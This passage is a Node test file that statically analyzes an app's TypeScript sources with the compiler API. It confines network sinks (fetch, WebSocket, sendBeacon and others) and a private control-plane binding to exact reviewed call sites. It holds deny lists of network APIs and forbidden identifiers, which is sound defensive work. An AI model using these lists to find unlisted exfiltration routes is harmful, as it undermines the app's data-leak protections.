// SPDX-License-Identifier: LicenseRef-Heel-Commercial

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { extname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import ts from "typescript";


const appRoot = new URL("../", import.meta.url);
const appRootPath = fileURLToPath(appRoot);
const browserSourceRoots = ["app", "components", "lib", "workers", "worker"];
const excludedDirectories = new Set([
  ".next", ".vinext", ".wrangler", "coverage", "dist", "generated",
  "node_modules", "out", "public", "tests", "vendor",
]);
const sourceExtensions = new Set([".js", ".jsx", ".mjs", ".ts", ".tsx"]);


async function source(path) {
  return readFile(new URL(path, appRoot), "utf8");
}


async function discoverOriginalSources(rootPath, roots = browserSourceRoots) {
  const files = [];
  async function walk(directory) {
    let entries;
    try {
      entries = await readdir(directory, { withFileTypes: true });
    } catch (error) {
      if (error?.code === "ENOENT") return;
      throw error;
    }
    for (const entry of entries) {
      if (entry.isDirectory() && excludedDirectories.has(entry.name)) continue;
      const path = join(directory, entry.name);
      if (entry.isDirectory()) await walk(path);
      else if (
        sourceExtensions.has(extname(entry.name))
        && !/\.(?:test|spec)\.[cm]?[jt]sx?$/.test(entry.name)
      ) files.push(path);
    }
  }
  for (const root of roots) await walk(join(rootPath, root));
  return files.sort();
}


function constantString(node) {
  if (ts.isStringLiteralLike(node)) return node.text;
  if (ts.isParenthesizedExpression(node)) return constantString(node.expression);
  if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const left = constantString(node.left);
    const right = constantString(node.right);
    return left === null || right === null ? null : left + right;
  }
  return null;
}


function memberName(node) {
  if (ts.isIdentifier(node)) return node.text;
  if (ts.isPropertyAccessExpression(node)) return node.name.text;
  if (ts.isElementAccessExpression(node) && node.argumentExpression) {
    return constantString(node.argumentExpression);
  }
  return null;
}


function rootName(node) {
  let current = node;
  while (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
    current = current.expression;
  }
  return ts.isIdentifier(current) ? current.text : null;
}


function enclosingFunctionName(node) {
  let current = node.parent;
  while (current) {
    if (ts.isFunctionLike(current)) {
      return ts.isFunctionDeclaration(current) && current.name ? current.name.text : null;
    }
    current = current.parent;
  }
  return null;
}


function containsSensitiveInput(node) {
  let found = false;
  function visit(current) {
    if (
      ts.isIdentifier(current)
      && /^(?:source|rawSource|answers|answersJson|answers_json|review|reviewJson|review_json|namespaceKey|namespace_key)$/.test(current.text)
    ) {
      found = true;
      return;
    }
    ts.forEachChild(current, visit);
  }
  visit(node);
  return found;
}


// H0X: the private control-plane sink lives only in this module, pinned by bytes (S3) and
// checked by lexical and token facts (S1, S2). None of these checks claims to model dataflow.
const CONTROL_PLANE_DISPATCH_PATH = "worker/control-plane-dispatch.ts";
const CONTROL_PLANE_DISPATCH_SHA256 = "cbebaa836f6ab880ecc5ed93bceb0a8670e72b9bc1aee0983692881b0df711a9";
const dispatchModuleImport = 'import { canonicalPublicOrigin } from "../build/deployment-config";';
const dispatchBindingGuard = `if (
    input.binding === undefined
    || input.binding === null
    || typeof input.binding.fetch !== "function"
  ) {
    return { kind: "unavailable" };
  }`;
const dispatchModuleFragments = [
  dispatchBindingGuard,
  "const origin = canonicalPublicOrigin(input.publicOrigin);",
  'if (origin === null) return { kind: "unavailable" };',
  "const url = new URL(input.upstreamPath, origin);",
  'if (input.contentLength !== 0 && input.body === null) return { kind: "invalid" };',
  "const response = await input.binding.fetch(new Request(url, init));",
  'if (response.status >= 300 && response.status <= 399) return { kind: "failed" };',
];
// Identifiers the module may not name anywhere, including comments and strings. Escaped spellings
// count: the scanner's normalized token value is compared as well as the raw token text.
const dispatchForbiddenIdentifiers = [
  "globalThis", "self", "window", "document", "arguments", "eval", "Function", "Reflect", "Proxy",
  "defineProperty", "prototype", "ASSETS", "IMAGES", "env", "request", "caches", "process", "require",
  "fetchLocal",
];
const dispatchConstructors = ["URL", "Request", "Uint8Array", "FixedLengthStream"];
// S4: the Worker refuses a malformed binding with its own guard, the first statement of the proxy and
// before any 400-producing check, so the fixed 503 ordering is unchanged; the module rechecks it.
const workerBindingGuard = `if (
    env.CONTROL_PLANE === undefined
    || env.CONTROL_PLANE === null
    || typeof env.CONTROL_PLANE.fetch !== "function"
  ) {
    return proxyError(503, "control plane unavailable", csp);
  }`;
// S4: the Worker's one reviewed call into the module.
const dispatchImport = 'import { dispatchControlPlane } from "./control-plane-dispatch";';
const dispatchCallSite = `const outcome = await dispatchControlPlane({
    binding: env.CONTROL_PLANE,
    publicOrigin: env.PUBLIC_ORIGIN,
    upstreamPath,
    method: request.method,
    headers: requestContract.headers,
    contentLength: requestContract.contentLength,
    body: request.body,
  });`;


function analyzeSource(fileName, text) {
  const parsed = ts.createSourceFile(
    fileName,
    text,
    ts.ScriptTarget.Latest,
    true,
    fileName.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS,
  );
  const relativeName = relative(appRootPath, fileName).replaceAll("\\", "/");
  const violations = [];
  const networkCapabilities = new Set([
    "fetch", "importScripts", "XMLHttpRequest", "WebSocket", "EventSource", "sendBeacon",
  ]);
  const ambientRoots = new Set([
    "document", "frames", "globalThis", "navigator", "parent", "self", "top", "window",
  ]);
  const runtimeAuthorityMembers = new Set([
    "contentDocument", "contentWindow", "defaultView", "ownerDocument",
  ]);
  const sinkAliases = new Set();
  const engineWorker = relativeName === "workers/heel-review.worker.ts";
  const serverWorker = relativeName === "worker/index.ts";
  const dispatchModule = relativeName === CONTROL_PLANE_DISPATCH_PATH;
  const findingsControlPlaneClient = relativeName === "lib/heel-cloud-api.ts";
  const canaryControlPlaneClient = relativeName === "lib/canary-api.ts";
  const controlPlaneClient = findingsControlPlaneClient || canaryControlPlaneClient;
  const constStringInitializers = new Map();

  function collectConstStringInitializers(node) {
    if (
      ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.initializer
      && ts.isVariableDeclarationList(node.parent)
      && (node.parent.flags & ts.NodeFlags.Const) !== 0
    ) {
      const existing = constStringInitializers.get(node.name.text) ?? [];
      existing.push(node.initializer);
      constStringInitializers.set(node.name.text, existing);
    }
    ts.forEachChild(node, collectConstStringInitializers);
  }
  collectConstStringInitializers(parsed);

  function resolvedConstantStrings(node, seen = new Set()) {
    if (ts.isStringLiteralLike(node)) return new Set([node.text]);
    if (ts.isParenthesizedExpression(node)) return resolvedConstantStrings(node.expression, seen);
    if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.PlusToken) {
      const values = new Set();
      for (const left of resolvedConstantStrings(node.left, seen)) {
        for (const right of resolvedConstantStrings(node.right, seen)) {
          if (values.size < 32) values.add(left + right);
        }
      }
      return values;
    }
    if (!ts.isIdentifier(node) || seen.has(node.text)) return new Set();
    const nestedSeen = new Set(seen).add(node.text);
    const values = new Set();
    for (const initializer of constStringInitializers.get(node.text) ?? []) {
      for (const value of resolvedConstantStrings(initializer, nestedSeen)) {
        if (values.size < 32) values.add(value);
      }
    }
    return values;
  }

  function resolvedMemberNames(node) {
    if (ts.isPropertyAccessExpression(node)) return new Set([node.name.text]);
    if (ts.isElementAccessExpression(node) && node.argumentExpression) {
      return resolvedConstantStrings(node.argumentExpression);
    }
    return new Set();
  }

  function bindingPropertyNames(element) {
    const property = element.propertyName ?? element.name;
    if (ts.isComputedPropertyName(property)) return resolvedConstantStrings(property.expression);
    if (ts.isIdentifier(property) || ts.isStringLiteralLike(property)) return new Set([property.text]);
    return new Set();
  }

  function report(node, message) {
    const location = parsed.getLineAndCharacterOfPosition(node.getStart(parsed));
    violations.push(`${relativeName}:${location.line + 1}:${location.character + 1}: ${message}`);
  }

  // The only private control-plane sink: the one awaited binding call in the dispatch module.
  function reviewedDispatchFetchCall(call) {
    return dispatchModule
      && ts.isCallExpression(call)
      && !call.questionDotToken
      && call.expression.getText(parsed) === "input.binding.fetch"
      && call.arguments.length === 1
      && call.arguments[0].getText(parsed) === "new Request(url, init)"
      && enclosingFunctionName(call) === "dispatchControlPlane"
      && ts.isAwaitExpression(call.parent);
  }

  function reviewedSameOriginFetchCall(call) {
    return controlPlaneClient
      && ts.isCallExpression(call)
      && !call.questionDotToken
      && ts.isIdentifier(call.expression)
      && call.expression.text === "fetch"
      && enclosingFunctionName(call) === (
        canaryControlPlaneClient ? "sameOriginCanaryFetch" : "sameOriginControlPlaneFetch"
      )
      && call.arguments.length === 2
      && call.arguments[0].getText(parsed) === "path"
      && call.arguments[1].getText(parsed) === "init"
      && ts.isReturnStatement(call.parent);
  }

  function allowedFetchReference(node) {
    const expression = node.getText(parsed);
    if (engineWorker && expression === "scope.fetch") {
      const bind = node.parent;
      const capture = ts.isPropertyAccessExpression(bind)
        && bind.name.text === "bind"
        ? bind.parent
        : null;
      return capture !== null
        && ts.isCallExpression(capture)
        && ts.isVariableDeclaration(capture.parent)
        && isReviewedBootstrapDeclaration(capture.parent);
    }
    if (reviewedDispatchCapabilityCheck(node) || reviewedWorkerCapabilityCheck(node)) return true;
    if (dispatchModule) {
      return ts.isCallExpression(node.parent) && node.parent.expression === node
        && reviewedDispatchFetchCall(node.parent);
    }
    return serverWorker && ts.isCallExpression(node.parent) && node.parent.expression === node
      && ["env.ASSETS.fetch", "handler.fetch"].includes(expression);
  }

  // `typeof` inspects the binding capability without calling or capturing it; in the Worker only the
  // binding-shape guard, the first statement of the proxy, may do so.
  function reviewedWorkerCapabilityCheck(node) {
    if (
      !serverWorker
      || node.getText(parsed) !== "env.CONTROL_PLANE.fetch"
      || !ts.isTypeOfExpression(node.parent)
      || enclosingFunctionName(node) !== "proxyControlPlane"
    ) return false;
    const guard = enclosingFunctionDeclaration(node)?.body?.statements[0];
    return guard !== undefined
      && ts.isIfStatement(guard)
      && guard.getText(parsed) === workerBindingGuard
      && node.getStart(parsed) >= guard.expression.getStart(parsed)
      && node.getEnd() <= guard.expression.getEnd();
  }

  // `typeof` inspects the binding capability without calling or capturing it; only the module's
  // configuration guard, the first statement of the dispatch, may do so.
  function reviewedDispatchCapabilityCheck(node) {
    if (
      !dispatchModule
      || node.getText(parsed) !== "input.binding.fetch"
      || !ts.isTypeOfExpression(node.parent)
      || enclosingFunctionName(node) !== "dispatchControlPlane"
    ) return false;
    const guard = enclosingFunctionDeclaration(node)?.body?.statements[0];
    return guard !== undefined
      && ts.isIfStatement(guard)
      && guard.getText(parsed) === dispatchBindingGuard
      && node.getStart(parsed) >= guard.expression.getStart(parsed)
      && node.getEnd() <= guard.expression.getEnd();
  }

  function allowedFetchCall(node) {
    const expression = node.expression.getText(parsed);
    if (serverWorker && ["env.ASSETS.fetch", "handler.fetch"].includes(expression)) return true;
    if (reviewedDispatchFetchCall(node)) return true;
    if (reviewedSameOriginFetchCall(node)) return true;
    return engineWorker && expression === "fetcher" && isReviewedFetcherCall(node);
  }

  function validateControlPlaneClientContract() {
    if (!controlPlaneClient) return;
    const sourceText = parsed.getFullText();
    const fetchContract = canaryControlPlaneClient
      ? "async function sameOriginCanaryFetch(path: string, init: RequestInit): Promise<Response> {\n  return fetch(path, init);\n}"
      : "async function sameOriginControlPlaneFetch(path: string, init: RequestInit): Promise<Response> {\n  return fetch(path, init);\n}";
    for (const fragment of [
      'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
      fetchContract,
      'if (!path.startsWith(`${CONTROL_PLANE_PREFIX}/v1/`) || path.includes("?") || path.includes("#"))',
      'cache: "no-store",',
      'credentials: "same-origin",',
      'redirect: "error",',
    ]) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `control-plane client is missing exact ${fragment}`);
      }
    }
  }

  function validateControlPlaneProxyContract() {
    const sourceText = parsed.getFullText();
    if (!serverWorker || !sourceText.includes("CONTROL_PLANE")) return;
    const routeContract = `function controlPlaneRoute(method: string, pathname: string): string | null {
  if (pathname !== CONTROL_PLANE_PREFIX && !pathname.startsWith(\`\${CONTROL_PLANE_PREFIX}/\`)) {
    return null;
  }
  const upstreamPath = pathname.slice(CONTROL_PLANE_PREFIX.length);
  if ((upstreamPath === SIGNUP_ROUTE || upstreamPath === LOGIN_ROUTE || upstreamPath === LOGOUT_ROUTE)
    && method === "POST") return upstreamPath;
  if (upstreamPath === ME_ROUTE && method === "GET") return upstreamPath;
  if (
    (PUBLIC_DEVICE_ROUTES.has(upstreamPath) || upstreamPath === DEVICE_VERIFY_ROUTE)
    && method === "POST"
  ) return upstreamPath;
  if ((upstreamPath === RUNNER_PAIRING_EXCHANGE || RUNNER_PAIRING_ACTIVATE.test(upstreamPath) || RUNNER_ROTATION_PUBLIC.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (RUNNER_PAIRING_MANAGE.test(upstreamPath) && (method === "GET" || method === "POST" || method === "DELETE")) return upstreamPath;
  if ((RUNNER_ROTATION_START.test(upstreamPath) || RUNNER_ROTATION_APPROVE.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (RUNNER_REVOKE.test(upstreamPath) && method === "POST") return upstreamPath;
  if ((RUNNER_CONTROL.test(upstreamPath) || RUNNER_CONTEXT_CONTROL.test(upstreamPath) || RUNNER_RESULT_PROJECTION.test(upstreamPath) || RUNNER_RESYNC.test(upstreamPath) || RUNNER_INACTIVE_CLAIM_ATTESTATION.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (isHumanCanaryRoute(method, upstreamPath) || isHumanEnvironmentRoute(method, upstreamPath)) return upstreamPath;
  if (PROJECTS_ROUTE.test(upstreamPath) && (method === "GET" || method === "POST")) {
    return upstreamPath;
  }
  if (PROJECT_KEY_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  if (FINDINGS_APPROVAL_ROUTE.test(upstreamPath) && method === "POST") return upstreamPath;
  if (FINDINGS_SYNC_ROUTE.test(upstreamPath) && method === "POST") return upstreamPath;
  if (REVIEWS_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  if (REVIEW_DETAIL_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  return "";
}`;
    if (sourceText.split(routeContract).length - 1 !== 1) {
      report(parsed, "control-plane route allowlist is not the reviewed exact contract");
    }
    for (const fragment of [
      'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
      'import { canonicalPublicOrigin } from "../build/deployment-config";',
      "const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
      'if (controlPlaneOrigin === null) return proxyError(503, "control plane unavailable", csp);',
      'const SIGNUP_ROUTE = "/v1/signup";',
      'const LOGIN_ROUTE = "/v1/login";',
      'const LOGOUT_ROUTE = "/v1/logout";',
      'const ME_ROUTE = "/v1/me";',
      'const DEVICE_START_ROUTE = "/v1/device/start";',
      'const DEVICE_VERIFY_ROUTE = "/v1/device/verify";',
      'const DEVICE_POLL_ROUTE = "/v1/device/poll";',
      'const DEVICE_TOKEN_ROUTE = "/v1/device/token";',
      'const DEVICE_REFRESH_ROUTE = "/v1/device/refresh";',
      'const DEVICE_REVOKE_ROUTE = "/v1/device/revoke";',
      `const PUBLIC_DEVICE_ROUTES = new Set([
  DEVICE_START_ROUTE,
  DEVICE_POLL_ROUTE,
  DEVICE_TOKEN_ROUTE,
  DEVICE_REFRESH_ROUTE,
  DEVICE_REVOKE_ROUTE,
]);`,
      'const WORKSPACE_REF = "ws_[0-9a-f]{16}";',
      'const PROJECT_REF = "prj_[0-9a-f]{32}";',
      'const SYNCED_REVIEW_REF = "synrev_[0-9a-f]{32}";',
      'const MAX_RUNNER_CLAIM_BODY_BYTES = 256;',
      'const MAX_RUNNER_CONTROL_BODY_BYTES = 36 * 1024;',
      'const MAX_RUNNER_RESULT_PROJECTION_BODY_BYTES = 272 * 1024;',
      'const MAX_RUNNER_RESYNC_BODY_BYTES = 2 * 1024;',
      'const MAX_RUNNER_PAIRING_BODY_BYTES = 16 * 1024;',
      "headers: requestContract.headers,",
      '`__Host-heel_session=${match[1]}; HttpOnly; SameSite=Lax; Path=/; Secure`',
      '"__Host-heel_session=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax; Secure"',
      'if (requestUrl.search !== "") return proxyError(400, "invalid control plane request", csp);',
      'if (upstreamPath === "") return proxyError(404, "not found", csp);',
      "return proxyControlPlane(request, env, csp, upstreamPath);",
    ]) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `control-plane proxy is missing exact ${fragment}`);
      }
    }
    if (!sourceText.includes(
      "function controlPlaneCredentials(source: Headers): Headers {\n  const headers = new Headers();",
    ) || !sourceText.includes(
      'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
    )) {
      report(parsed, "control-plane request/response header allowlists are not the reviewed exact contract");
    }
    if (
      sourceText.split(
        'for (const name of ["Content-Type", "Content-Length", "Retry-After"])',
      ).length - 1 !== 1
    ) {
      report(parsed, "control-plane response header allowlist is not the reviewed exact contract");
    }
    validateControlPlaneDispatchCallSite();
  }

  function reportAt(position, message) {
    const location = parsed.getLineAndCharacterOfPosition(position);
    violations.push(`${relativeName}:${location.line + 1}:${location.character + 1}: ${message}`);
  }

  // S4: the Worker reaches the private binding only through the one reviewed module call. These are
  // exact text and token facts about where the sink is; they do not claim the Worker cannot alias.
  function validateControlPlaneDispatchCallSite() {
    const sourceText = parsed.getFullText();
    if (sourceText.split(dispatchImport).length - 1 !== 1) {
      report(parsed, `control-plane dispatch call site is missing exact ${dispatchImport}`);
    }
    if (sourceText.split("CONTROL_PLANE.fetch").length - 1 !== 1) {
      report(parsed, "control-plane worker names CONTROL_PLANE.fetch outside its one binding-shape guard");
    }
    const proxy = parsed.statements.find((statement) => (
      ts.isFunctionDeclaration(statement) && statement.name?.text === "proxyControlPlane"
    ));
    if (proxy?.body?.statements[0]?.getText(parsed) !== workerBindingGuard) {
      report(parsed, "control-plane worker binding-shape guard is not the first statement of proxyControlPlane");
    }
    for (const forbidden of ['CONTROL_PLANE["fetch"]', ".pipeThrough(", "FixedLengthStream"]) {
      if (sourceText.includes(forbidden)) {
        report(parsed, `control-plane worker contains sink text reserved for the dispatch module: ${forbidden}`);
      }
    }
    const calls = [];
    function inspect(node) {
      if (
        (ts.isIdentifier(node) && node.text === "pipeThrough")
        || (ts.isStringLiteralLike(node) && node.text === "pipeThrough")
      ) report(node, "control-plane worker names pipeThrough outside the dispatch module");
      if (ts.isIdentifier(node) && node.text === "dispatchControlPlane" && !ts.isImportSpecifier(node.parent)) {
        if (ts.isCallExpression(node.parent) && node.parent.expression === node) calls.push(node.parent);
        else report(node, "control-plane dispatch is referenced outside its one reviewed call");
      }
      if (ts.isCallExpression(node)) {
        const fetchShaped = (ts.isIdentifier(node.expression) && node.expression.text === "fetch")
          || resolvedMemberNames(node.expression).has("fetch");
        if (fetchShaped && !["env.ASSETS.fetch", "handler.fetch"].includes(node.expression.getText(parsed))) {
          report(node, "control-plane worker has an unreviewed fetch-shaped call");
        }
      }
      ts.forEachChild(node, inspect);
    }
    inspect(parsed);
    const statement = calls.length === 1 ? calls[0].parent?.parent?.parent?.parent : undefined;
    if (
      calls.length !== 1
      || enclosingFunctionName(calls[0]) !== "proxyControlPlane"
      || !ts.isAwaitExpression(calls[0].parent)
      || statement === undefined
      || !ts.isVariableStatement(statement)
      || statement.getText(parsed) !== dispatchCallSite
    ) report(parsed, "control-plane dispatch is not the one reviewed call in proxyControlPlane");
  }

  // S1 and S2: lexical and token facts about the dispatch module. They prove where the sink is and
  // what the module can name, not what any value flows to.
  function validateControlPlaneDispatchModule() {
    const sourceText = parsed.getFullText();
    const scanner = ts.createScanner(ts.ScriptTarget.Latest, false, ts.LanguageVariant.Standard, sourceText);
    const unescape = (value) => value.replace(
      /\\u\{([0-9A-Fa-f]+)\}|\\u([0-9A-Fa-f]{4})/g,
      (_, braced, plain) => String.fromCodePoint(Number.parseInt(braced ?? plain, 16)),
    );
    const forbiddenWords = dispatchForbiddenIdentifiers.map((name) => [
      name, new RegExp(`(?<![A-Za-z0-9_$])${name}(?![A-Za-z0-9_$])`),
    ]);
    for (let kind = scanner.scan(); kind !== ts.SyntaxKind.EndOfFileToken; kind = scanner.scan()) {
      const raw = scanner.getTokenText();
      // Compare the scanner's normalized token value as well as the raw token text (H0XA).
      const spellings = [raw, scanner.getTokenValue() ?? "", unescape(raw)];
      for (const [name, word] of forbiddenWords) {
        if (spellings.some((spelling) => word.test(spelling))) {
          reportAt(scanner.getTokenStart(), `control-plane dispatch module names forbidden identifier ${name}`);
        }
      }
    }
    const imports = parsed.statements.filter((statement) => ts.isImportDeclaration(statement));
    if (imports.length !== 1 || imports[0].getText(parsed) !== dispatchModuleImport) {
      report(parsed, "control-plane dispatch module imports anything but the shared origin validator");
    }
    const typeSignatures = new Set([
      ts.SyntaxKind.MethodSignature, ts.SyntaxKind.CallSignature, ts.SyntaxKind.ConstructSignature,
      ts.SyntaxKind.IndexSignature, ts.SyntaxKind.FunctionType, ts.SyntaxKind.ConstructorType,
    ]);
    const fetchAccesses = [];
    const pipes = [];
    const redirects = [];
    let dispatchDeclarations = 0;
    function inspect(node) {
      if (ts.isCallExpression(node) && node.expression.kind === ts.SyntaxKind.ImportKeyword) {
        report(node, "control-plane dispatch module uses dynamic import");
      }
      if (
        ts.isExportAssignment(node)
        || (ts.canHaveModifiers(node) && ts.getModifiers(node)?.some((modifier) => modifier.kind === ts.SyntaxKind.DefaultKeyword))
      ) report(node, "control-plane dispatch module has a default export");
      if (ts.isExportDeclaration(node) && node.moduleSpecifier) report(node, "control-plane dispatch module re-exports another module");
      if (ts.isClassDeclaration(node) || ts.isClassExpression(node)) report(node, "control-plane dispatch module declares a class");
      if (ts.isFunctionLike(node) && !typeSignatures.has(node.kind)) {
        if (ts.isFunctionDeclaration(node) && node.name?.text === "dispatchControlPlane" && node.parent === parsed) {
          dispatchDeclarations += 1;
        } else report(node, "control-plane dispatch module declares a function other than dispatchControlPlane");
      }
      if (ts.isNewExpression(node) && !dispatchConstructors.includes(node.expression.getText(parsed))) {
        report(node, `control-plane dispatch module constructs ${node.expression.getText(parsed)}`);
      }
      if (ts.isElementAccessExpression(node)) report(node, "control-plane dispatch module uses a computed member access");
      if (ts.isStringLiteralLike(node) && ["fetch", "pipeThrough", "redirect"].includes(node.text)) {
        report(node, `control-plane dispatch module spells ${node.text} as a string`);
      }
      if (
        (ts.isStringLiteralLike(node) || ts.isTemplateHead(node) || ts.isTemplateMiddle(node) || ts.isTemplateTail(node))
        && node.text.includes("://")
      ) report(node, "control-plane dispatch module names a literal destination");
      if (ts.isIdentifier(node) && node.text === "fetch") {
        const parent = node.parent;
        if (
          ts.isMethodSignature(parent) && parent.name === node
          && ts.isInterfaceDeclaration(parent.parent) && parent.parent.name.text === "ControlPlaneBinding"
        ) {
          // The binding's declared shape.
        } else if (ts.isPropertyAccessExpression(parent) && parent.name === node && parent.getText(parsed) === "input.binding.fetch") {
          fetchAccesses.push(parent);
        } else report(node, "control-plane dispatch module names fetch outside the binding guard and call");
      }
      if (ts.isIdentifier(node) && node.text === "pipeThrough") {
        if (ts.isPropertyAccessExpression(node.parent) && node.parent.name === node) pipes.push(node.parent);
        else report(node, "control-plane dispatch module names pipeThrough outside the reviewed framing");
      }
      if (ts.isIdentifier(node) && node.text === "redirect") {
        if (ts.isPropertyAssignment(node.parent) && node.parent.name === node) redirects.push(node.parent);
        else report(node, "control-plane dispatch module writes the redirect mode outside the request options");
      }
      ts.forEachChild(node, inspect);
    }
    inspect(parsed);
    const guardReads = fetchAccesses.filter(reviewedDispatchCapabilityCheck);
    const sinkCalls = fetchAccesses.filter((access) => (
      ts.isCallExpression(access.parent) && access.parent.expression === access && reviewedDispatchFetchCall(access.parent)
    ));
    if (dispatchDeclarations !== 1) report(parsed, "control-plane dispatch module does not declare exactly one dispatchControlPlane");
    if (fetchAccesses.length !== 2 || guardReads.length !== 1 || sinkCalls.length !== 1) {
      report(parsed, "control-plane dispatch module does not have exactly one binding guard read and one binding call");
    }
    if (
      pipes.length !== 1
      || !ts.isCallExpression(pipes[0].parent)
      || pipes[0].parent.expression !== pipes[0]
      || pipes[0].parent.getText(parsed) !== "input.body!.pipeThrough(new FixedLengthStream(input.contentLength))"
    ) report(parsed, "control-plane dispatch module does not frame the body through exactly one FixedLengthStream pipe");
    if (redirects.length !== 1 || redirects[0].getText(parsed) !== 'redirect: "manual"') {
      report(parsed, "control-plane dispatch module redirect mode is not exactly manual");
    }
    if (/["'`]https?:\/\//.test(sourceText)) report(parsed, "control-plane dispatch module names a literal destination");
    for (const fragment of dispatchModuleFragments) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `control-plane dispatch module is missing exact ${fragment}`);
      }
    }
  }

  function isReviewedBootstrapDeclaration(declaration) {
    if (
      !ts.isIdentifier(declaration.name)
      || declaration.name.text !== "bootstrapFetch"
      || declaration.type?.getText(parsed) !== "typeof fetch | null"
      || !ts.isVariableDeclarationList(declaration.parent)
      || (declaration.parent.flags & ts.NodeFlags.Let) === 0
      || (declaration.parent.flags & ts.NodeFlags.Const) !== 0
    ) return false;
    const capture = declaration.initializer;
    if (!capture || !ts.isCallExpression(capture) || capture.questionDotToken) return false;
    const bind = capture.expression;
    if (!ts.isPropertyAccessExpression(bind) || bind.name.text !== "bind") return false;
    const fetchMember = bind.expression;
    return ts.isPropertyAccessExpression(fetchMember)
      && ts.isIdentifier(fetchMember.expression)
      && fetchMember.expression.text === "scope"
      && fetchMember.name.text === "fetch"
      && capture.arguments.length === 1
      && ts.isIdentifier(capture.arguments[0])
      && capture.arguments[0].text === "scope";
  }

  function enclosingFunctionDeclaration(node) {
    let current = node.parent;
    while (current) {
      if (ts.isFunctionLike(current)) return ts.isFunctionDeclaration(current) ? current : null;
      current = current.parent;
    }
    return null;
  }

  function isReviewedFetcherDeclaration(declaration) {
    return ts.isIdentifier(declaration.name)
      && declaration.name.text === "fetcher"
      && ts.isVariableDeclarationList(declaration.parent)
      && (declaration.parent.flags & ts.NodeFlags.Const) !== 0
      && declaration.initializer !== undefined
      && ts.isIdentifier(declaration.initializer)
      && declaration.initializer.text === "bootstrapFetch"
      && enclosingFunctionName(declaration) === "fetchLocal";
  }

  function hasReviewedPathGuards(functionNode) {
    let startsAtRuntimeRoot = false;
    let rejectsTraversal = false;
    function inspect(current) {
      if (ts.isCallExpression(current) && ts.isPropertyAccessExpression(current.expression)) {
        const owner = current.expression.expression;
        const name = current.expression.name.text;
        if (ts.isIdentifier(owner) && owner.text === "path" && current.arguments.length === 1) {
          if (
            name === "startsWith"
            && ts.isIdentifier(current.arguments[0])
            && current.arguments[0].text === "RUNTIME_ROOT"
          ) startsAtRuntimeRoot = true;
          if (
            name === "includes"
            && ts.isStringLiteralLike(current.arguments[0])
            && current.arguments[0].text === ".."
          ) rejectsTraversal = true;
        }
      }
      ts.forEachChild(current, inspect);
    }
    inspect(functionNode);
    return startsAtRuntimeRoot && rejectsTraversal;
  }

  function isReviewedFetchOptions(node) {
    if (!ts.isObjectLiteralExpression(node) || node.properties.length !== 3) return false;
    const expected = new Map([
      ["cache", "no-store"],
      ["credentials", "same-origin"],
      ["redirect", "error"],
    ]);
    for (const property of node.properties) {
      if (!ts.isPropertyAssignment(property)) return false;
      const name = ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name)
        ? property.name.text
        : null;
      if (
        name === null
        || !ts.isStringLiteralLike(property.initializer)
        || property.initializer.text !== expected.get(name)
      ) return false;
      expected.delete(name);
    }
    return expected.size === 0;
  }

  function isReviewedFetcherCall(node) {
    if (!ts.isCallExpression(node) || node.questionDotToken || node.arguments.length !== 2) return false;
    const functionNode = enclosingFunctionDeclaration(node);
    return functionNode?.name?.text === "fetchLocal"
      && functionNode.parameters.length === 1
      && ts.isIdentifier(functionNode.parameters[0].name)
      && functionNode.parameters[0].name.text === "path"
      && functionNode.parameters[0].type?.getText(parsed) === "string"
      && functionNode.type?.getText(parsed) === "Promise<Response>"
      && hasReviewedPathGuards(functionNode)
      && ts.isIdentifier(node.arguments[0])
      && node.arguments[0].text === "path"
      && isReviewedFetchOptions(node.arguments[1]);
  }

  function capabilitySource(node) {
    if (ts.isIdentifier(node)) {
      if (networkCapabilities.has(node.text) || sinkAliases.has(node.text)) return node.text;
      return null;
    }
    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      for (const name of resolvedMemberNames(node)) {
        if (networkCapabilities.has(name) && !allowedFetchReference(node)) return name;
      }
    }
    return null;
  }

  function recordAlias(target, sourceNode, reportNode = target) {
    if (!ts.isIdentifier(target) || capabilitySource(sourceNode) === null) return;
    sinkAliases.add(target.text);
    report(reportNode, `network sink alias ${target.text}`);
  }

  function isRuntimeIdentifierReference(node) {
    let current = node.parent;
    while (current && !ts.isSourceFile(current)) {
      if (ts.isTypeNode(current)) return false;
      current = current.parent;
    }
    const parent = node.parent;
    if (ts.isPropertyAccessExpression(parent) && parent.name === node) return false;
    if (
      ts.isNamedDeclaration(parent)
      && parent.name === node
      && !ts.isShorthandPropertyAssignment(parent)
    ) return false;
    return true;
  }

  function isCapabilityIdentifierReference(node) {
    return networkCapabilities.has(node.text) && isRuntimeIdentifierReference(node);
  }

  function allowedObjectReference(node) {
    const member = node.parent;
    if (
      !(ts.isPropertyAccessExpression(member) || ts.isElementAccessExpression(member))
      || member.expression !== node
    ) return false;
    const call = member.parent;
    if (!ts.isCallExpression(call) || call.expression !== member) return false;
    const name = memberName(member);
    if (["entries", "freeze", "fromEntries", "is", "keys", "values"].includes(name ?? "")) return true;
    return engineWorker
      && name === "defineProperty"
      && enclosingFunctionName(call) === "guardProperty"
      && call.arguments.length >= 2
      && ts.isIdentifier(call.arguments[0])
      && call.arguments[0].text === "owner"
